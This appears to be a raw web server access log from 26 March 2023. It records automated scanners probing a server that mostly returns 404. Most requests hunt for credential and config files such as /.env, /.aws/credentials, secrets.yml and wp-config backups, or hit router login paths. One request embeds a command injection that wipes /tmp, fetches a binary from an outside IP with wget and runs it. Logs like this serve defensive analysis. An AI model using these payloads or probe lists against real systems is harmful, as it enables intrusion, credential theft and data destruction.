43.154.141.71 - - [26/Mar/2023:17:28:30 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
109.206.241.102 - - [26/Mar/2023:17:45:28 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
109.206.241.102 - - [26/Mar/2023:17:45:28 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
109.206.241.102 - - [26/Mar/2023:17:45:28 +0000] "POST / HTTP/1.1" 405 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
135.125.244.48 - - [26/Mar/2023:18:02:32 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:18:02:32 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.32.162.159 - - [26/Mar/2023:18:23:00 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [26/Mar/2023:18:23:10 +0000] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.132 - - [26/Mar/2023:18:42:29 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8E\xFCy\x9AF%x\xEF)\x11\xB5<\x00\x90\xF9|\x1F[\xBD\xFC\x8Bj\xDEw\xD5!\xD1\xA2\xAD\x11*_\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
102.67.228.181 - - [26/Mar/2023:18:44:56 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.67.228.181 - - [26/Mar/2023:18:44:57 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.67.228.181 - - [26/Mar/2023:18:44:57 +0000] "POST / HTTP/1.1" 405 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.67.228.181 - - [26/Mar/2023:18:44:57 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.67.228.181 - - [26/Mar/2023:18:44:58 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.67.228.181 - - [26/Mar/2023:18:44:58 +0000] "HEAD /config.json HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
43.154.141.71 - - [26/Mar/2023:18:46:15 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
172.105.128.11 - - [26/Mar/2023:18:54:53 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xBC\x94\xDA\xD0\x88M\x1Cl\x09(\xE2\x93\xFE6\xFB\xE7\x05#\x85\x97\xE7\xDF\xC3\xAE\x07x\xB3\xF3?\xF2\xB8\x90\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
172.105.128.13 - - [26/Mar/2023:19:01:58 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x22C\x88\x0B8\xECDv\xF9\xD9}\xF8\xA7m\x8F\x07l\x1B\xE0N\x07\xA0\xA9t\xDC#\x97\x16\xB3\xE2\xF1\x14\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
54.149.73.163 - - [26/Mar/2023:19:03:35 +0000] "GET /.git/HEAD HTTP/1.1" 404 162 "-" "Python-urllib/3.9"
54.149.73.163 - - [26/Mar/2023:19:35:15 +0000] "GET /.git/HEAD HTTP/1.1" 404 162 "-" "Python-urllib/3.9"
135.125.244.48 - - [26/Mar/2023:19:36:32 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:19:36:32 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
119.41.143.200 - - [26/Mar/2023:19:43:46 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
45.128.232.149 - - [26/Mar/2023:19:59:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://18.222.50.103:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.149 - - [26/Mar/2023:19:59:38 +0000] "" 400 0 "-" "-"
43.154.141.71 - - [26/Mar/2023:20:03:55 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
104.28.251.139 - - [26/Mar/2023:20:17:27 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 134 "-" "Mozilla/5.0"
185.225.74.42 - - [26/Mar/2023:20:17:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://18.222.50.103:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.225.74.42 - - [26/Mar/2023:20:17:31 +0000] "" 400 0 "-" "-"
147.135.165.20 - - [26/Mar/2023:20:23:38 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
135.125.244.48 - - [26/Mar/2023:20:38:19 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:20:38:19 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.154 - - [26/Mar/2023:20:58:26 +0000] "GET / HTTP/1.0" 200 13 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.104.11.34 - - [26/Mar/2023:21:00:08 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03!S9n\xFB!g(\xFEq\xF8\xE6\xCA{3\xC3\x98\x11\xA5X\x95\xE4]6h\x88K\xD4\xF9S\x0F\x01\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
193.32.162.159 - - [26/Mar/2023:21:11:06 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [26/Mar/2023:21:11:16 +0000] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.154.141.71 - - [26/Mar/2023:21:21:25 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:52 +0000] "GET /awsConfig.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:53 +0000] "GET /config/env.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:53 +0000] "GET /config/config.json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:54 +0000] "GET /config/aws-exports.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:54 +0000] "GET /aws-exports.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:54 +0000] "GET /sendgrid.envapp.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:55 +0000] "GET /langConfig.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:55 +0000] "GET /config/aws.json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:56 +0000] "GET /config/awsconfig.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:56 +0000] "GET /config/env.prod.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:56 +0000] "GET /env.dev.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:57 +0000] "GET /config/awsConfig.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:57 +0000] "GET /awsconfig.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:58 +0000] "GET /config.json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:58 +0000] "GET /config/config.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:58 +0000] "GET /config/sendgrid.envapp.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:59 +0000] "GET /aws.json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:34:59 +0000] "GET /config.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:00 +0000] "GET /config/env.dev.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:00 +0000] "GET /env.prod.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:00 +0000] "GET /env.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:01 +0000] "GET /config/settings.yml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:01 +0000] "GET /config/configuration.yml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:02 +0000] "GET /secrets.yml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:02 +0000] "GET /settings.yml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:02 +0000] "GET /config/secrets.yml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:03 +0000] "GET /configuration.yml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:03 +0000] "GET /index.js HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:04 +0000] "GET /.aws/credentials HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:04 +0000] "GET /.wp-config.php.swp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:04 +0000] "GET /_phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:05 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:05 +0000] "GET /admin/dashboard/info.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:05 +0000] "GET /admin/phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:06 +0000] "GET /api/phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:06 +0000] "GET /api/src HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:07 +0000] "GET /check.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:07 +0000] "GET /configuration.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:07 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:08 +0000] "GET /dashboard/test.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:08 +0000] "GET /debug/default HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:09 +0000] "GET /develop/info.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:09 +0000] "GET /frontend_dev.php/$ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:09 +0000] "GET /i.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:10 +0000] "GET /index.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:10 +0000] "GET /info.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:11 +0000] "GET /info/phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:11 +0000] "GET /info1.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:11 +0000] "GET /local-phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:12 +0000] "GET /p.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:12 +0000] "GET /php-info HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:13 +0000] "GET /php-info.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:13 +0000] "GET /php.ini HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:13 +0000] "GET /php.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:14 +0000] "GET /php/phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:14 +0000] "GET /php_info.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:15 +0000] "GET /phpinfo HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:15 +0000] "GET /phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:15 +0000] "GET /phpinfo/phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:16 +0000] "GET /phptest.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:16 +0000] "GET /pi.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:17 +0000] "GET /root/infophp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:17 +0000] "GET /server/phpinfo.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:17 +0000] "GET /temp.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:18 +0000] "GET /test.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:18 +0000] "GET /test1.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:19 +0000] "GET /test2.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:19 +0000] "GET /testing.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:19 +0000] "GET /testphpinfo HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:20 +0000] "GET /tools/info.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:20 +0000] "GET /wp-config.backup HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:21 +0000] "GET /wp-config.bak HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:21 +0000] "GET /wp-config.orig HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:21 +0000] "GET /wp-config.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:22 +0000] "GET /wp-config.php. HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
